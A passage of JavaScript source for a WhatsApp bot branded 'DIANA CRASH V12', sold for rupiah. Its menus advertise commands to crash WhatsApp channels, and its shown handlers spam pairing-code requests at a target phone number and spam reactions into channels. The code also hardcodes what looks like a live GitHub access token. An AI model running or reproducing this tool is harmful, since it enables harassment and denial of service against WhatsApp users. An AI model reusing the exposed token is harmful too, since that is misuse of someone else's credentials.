╔══⪨ \`Bug Channel\` ⪩════╗
║𖥞 ⧼ ForcloseCh ⧽
┃𖤛 ⧼ CrashCh ⧽
║𖥞 ⧼ BrutalCh ⧽
╚═════════════════╝

╔═════════════╗
*\`press the button\`*
╚═════════════╝`;

  const buttons = [
    { buttonId: '.ownermenu', buttonText: { displayText: 'Owner Menu👏' }, type: 1 },
    { buttonId: '.funmenu', buttonText: { displayText: 'Fun Menu🧬' }, type: 1 }, 
    { buttonId: '.owner', buttonText: { displayText: 'Owner Script💝' }, type: 1 }
  ];

  await asep.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/ntuhhm.jpg' },
    caption: itsmenu,
    footer: '𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑',
    buttons: buttons,
    headerType: 4
  }, { quoted: lol });

  // Kirim audio sebagai voice note (PTT = true)
  await asep.sendMessage(m.chat, {
    audio: { url: './image/menu.mp3' }, // ganti path dengan lokasi file kamu
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: qpayment });
}
break;
case "ownermenu": {
await asep.sendMessage(m.chat, { react: { text: "😍",key: m.key,}}); 
  const itsmenu = `
 \` ｢ *𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑* ｣ \`
*नमस्ते👋* \`${pushname}\`
*मैं DIANA CRASH V12☠️ हूँ। मैं सिस्टम को क्रैश करने आई हूँ 💀। मेरा डेवलपर Diana👩‍💻 है।*

*\` ⌜Owner Menu⌟ \`*
─────────────────
▧ Addacces ⧼premium user⧽
▧ Delacces : ⧼menghapus prem⧽
▧ Self : ⧼mode sok cool anj⧽
▧ Public :  ⧼Mode Friendly⧽
─────────────────
*友人の皆さん、ここのボ*
*タンを選択してください。*
─────────────────`;

  const buttons = [
    { buttonId: '.bugmenu', buttonText: { displayText: 'Bug Menu🪬' }, type: 1 },
    { buttonId: '.funmenu', buttonText: { displayText: 'Fun Menu👏' }, type: 1 },
    { buttonId: '.owner', buttonText: { displayText: 'My Owner💝' }, type: 1 }
  ];

  await asep.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/ijtndq.jpg' },
    caption: itsmenu,
    footer: '𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑',
    buttons: buttons,
    headerType: 4
  }, { quoted: lol });

  // Kirim audio sebagai voice note (PTT = true)
  await asep.sendMessage(m.chat, {
    audio: { url: './image/menu.mp3' }, // ganti path dengan lokasi file kamu
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: qpayment });
}
break;
case "funmenu": {
await asep.sendMessage(m.chat, { react: { text: "🕷️",key: m.key,}}); 
  const itsmenu = `
*選択してください* \`${pushname}\`
*私のバグボットです*
*ここからメニューを選択してください*

╔══⪨ \`Fun Menu\` ⪩════╗
║𖥞 ⧼ SpamPairing ⧽
┃𖤛 ⧼ SpamReactCh ⧽
╚═════════════════╝

╔═════════════╗
*\`press the button\`*
╚═════════════╝`;

  const buttons = [
    { buttonId: '.bugmenu', buttonText: { displayText: 'Bug Menu🕷️' }, type: 1 },
    { buttonId: '.ownermenu', buttonText: { displayText: 'Owner Menu🧿' }, type: 1 },
    { buttonId: '.owner', buttonText: { displayText: 'My Owner🍻' }, type: 1 }
  ];

  await asep.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/ijtndq.jpg' },
    caption: itsmenu,
    footer: '𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑...',
    buttons: buttons,
    headerType: 4
  }, { quoted: lol });

  // Kirim audio sebagai voice note (PTT = true)
  await asep.sendMessage(m.chat, {
    audio: { url: './image/menu.mp3' }, // ganti path dengan lokasi file kamu
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: qpayment });
}
break;
case 'owner': case "zam": case 'dev': {
await asep.sendMessage(m.chat, { react: { text: "🌌",key: m.key,}}); 
let menu = `
*\`𝖢𝖱𝖤𝖠𝖳𝖮𝖱 𝖲𝖢𝖱𝖨𝖯𝖳\`*`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `𝐃͠𝐢͢𝐚͠𝐧͢𝐚⚢͋𝐂͢͠𝐫𝐚𝐬͢͠𝐡⇜🧝`,
 newsletterJid: "120363418937884318@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: asep.decodeJid(asep.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "𝖮𝖶𝖭𝖤𝖱 𝖲𝖢𝖱𝖨𝖯𝖳"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "🇮🇳𝗗𝗶𝗮𝗻𝗮 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹🇮🇳"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: foto }, { upload: asep.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝖮𝗐𝗇𝖾𝗋\",\"url\":\"https://wa.me/18492823944\",\"merchant_url\":\"https://wa.me/18492823944\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝖲𝖺𝗅𝗎𝗋𝖺𝗇 𝖮𝗐𝗇𝖾𝗋\",\"url\":\"https://whatsapp.com/channel/0029VbAxlQKHFxOvBw4stl3s\",\"merchant_url\":\"https://wa.me/18492823944\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗌𝗂 𝖲𝖼𝗋𝗂𝗉𝗍\",\"url\":\"https://whatsapp.com/channel/0029VbAx6A44inoy09TyHr21\",\"merchant_url\":\"wa.me/18492823944\"}`
}],
 })
 })
 }
 }
}, {})

await asep.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break
case "buysc":
case "sc": {
await asep.sendMessage(m.chat, { react: { text: "🕊️",key: m.key,}}); 
let teks = `*😈 SCRIPT 𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜🧝*
[ ! ] _Via WhatsApp_

*_\`Price Script｜\` Rp25.000_*
*_\`Price Reseller｜\` Rp50.000_*
*_\`Price Partner｜\` Rp70.000_*

\`[ MINAT PV ]\`
wa : wa.me/18492823944`
  const media = await prepareWAMessageMedia({ image: foto }, { upload: asep.waUploadToServer });

  const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          mentionedJid: [m.sender],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363418937884318@newsletter",
            newsletterName: "𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑",
            serverMessageId: 1
          }
        },
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: media.imageMessage,
            title: teks
          },
          body: { text: "" },
          footer: { text: "𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑.." },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "Contact Owner",
                  url: "https://wa.me/18492823944",
                  merchant_url: "https://wa.me/18492823944"
                })
              }
            ]
          }
        }
      }
    }
  }), { userJid: m.chat, quoted: lol });

  asep.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break
case "tqto": {
await asep.sendMessage(m.chat, { react: { text: "❤️‍🔥",key: m.key,}}); 
const teks = `
*▭▬▭( Thanks To )▭▬▭*

𝘿𝙞𝙖𝙉𝙖🧝 *[DEVELOPER]*

𝘿𝙚𝙣𝙕𝙮𝙮🥰 *<My Friend>*

𝙈𝙖𝙠𝙖𝙢𝙚𝙨𝙘𝙤😘 *<My Friend>*
 
▬▭▬▭▬▭▬▭▬▭▬▭`
const buttons = [
    { buttonId: '.ownermenu', buttonText: { displayText: 'Owner menu' }, type: 1 },
    { buttonId: '.bugmenu', buttonText: { displayText: 'Bug Menu' }, type: 1 }, 
    { buttonId: '.owner', buttonText: { displayText: 'My Owner' }, type: 1 }
  ];

await asep.sendMessage(m.chat, {
    image: { url: 'https://img1.pixhost.to/images/7060/619852706_imgtmp.jpg' },
    caption: teks,
    footer: '𝐐͠𝐮͢𝐞͠𝐞͢𝐧⚢͋𝐃͢͠𝐢𝐚𝐧͢͠𝐚⇜👑...',
    buttons: buttons,
    headerType: 4
  }, { quoted: lol });

  // Kirim audio sebagai voice note (PTT = true)
  await asep.sendMessage(m.chat, {
    audio: { url: './image/menu.mp3' }, // ganti path dengan lokasi file kamu
    mimetype: 'audio/mpeg',
    ptt: true
  }, { quoted: qpayment });
}
break;
case 'adddb': {
 if (!isCreator) return m.reply(mess.owner);
 if (!isPremium) return m.reply(mess.owner);
 if (!q) return m.reply('❌ Anda harus mengirimkan nomor yang akan ditambahkan ke database.');

 const phoneNumber = q.trim(); // Nomor yang ingin ditambahkan
 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'asepgacor'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'dbzam'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'dtbs.json'; // Path ke file JSON di repositori Anda

 try {
 // Ambil data JSON dari GitHub
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();

 // Validasi apakah data sudah ada
 if (!jsonData || !jsonData.data || !Array.isArray(jsonData.data)) {
 return m.reply('❌ Struktur data tidak valid.');
 }

 // Cek apakah nomor sudah ada di database
 if (jsonData.data.includes(phoneNumber)) {
 return m.reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
 }

 // Tambahkan nomor baru ke array data
 jsonData.data.push(phoneNumber); // Nomor ditambahkan di akhir array

 // Encode data JSON menjadi base64 untuk diupload ke GitHub
 const updatedData = JSON.stringify(jsonData, null, 2); // Format JSON dengan indentation 2 spasi
 const base64Content = Buffer.from(updatedData).toString('base64'); // Encode ke base64

 // Ambil SHA dari file GitHub yang ada
 const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
 const shaData = await shaResponse.json();
 const currentSHA = shaData.sha; // SHA file yang ada

 // Update file di GitHub
 const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
 method: 'PUT',
 headers: {
 'Authorization': `Bearer ${GITHUB_TOKEN}`,
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 message: `Menambahkan nomor ${phoneNumber} ke database`,
 content: base64Content,
 sha: currentSHA, // SHA file yang ada
 }),
 });

 const updateResult = await updateResponse.json();

 if (updateResponse.status === 200) {
 return m.reply(`✅ Nomor ${phoneNumber} berhasil ditambahkan ke database.`);
 } else {
 throw new Error(`Error menambahkan nomor: ${updateResult.message}`);
 }

 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
}
break;
case "addacces": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("Example: /addacces (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`Yah si kontol ${user} udah jadi murbug`)}
break;
//======================
case "delacces": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("Example: /delacces (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `𝗠𝗮𝗺𝗽𝘂𝘀𝘀𝘀 𝗡𝗼𝗺𝗼𝗿 ${user} 𝗕𝘂𝗸𝗮𝗻 𝗠𝘂𝗿𝗯𝘂𝗴 𝗟𝗮𝗴𝗶` : "𝗨𝘀𝗲𝗿 𝘁𝗶𝗱𝗮𝗸 𝗱𝗶𝘁𝗲𝗺𝘂𝗸𝗮𝗻")}
break;
//======================
//case reactch
  case "spamreactch": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await asep.newsletterMetadata("invite", result)

await asep.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spampairing': {
  if (!isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}